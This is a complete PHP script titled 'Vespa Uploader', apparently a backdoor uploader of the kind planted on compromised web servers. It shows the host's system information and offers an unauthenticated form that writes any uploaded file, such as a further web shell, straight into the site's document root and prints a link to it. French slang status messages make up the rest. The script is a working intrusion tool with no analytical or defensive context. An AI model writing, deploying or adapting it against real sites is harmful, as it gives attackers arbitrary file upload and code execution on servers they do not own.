<?php
echo "Vespa Uploader<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='kiki'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['kiki']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['kiki']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "J'avais pleins de gadgets dans mon cartable spiderman -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Y'a pas moyen gros.";
		}
	} else {
		if(@copy($_FILES['kiki']['tmp_name'], $files)) {
			echo "Ton fichier : <b>$files</b> as été upload dans le même folder";
		} else {
			echo "C mort";
		}
	}
}
?>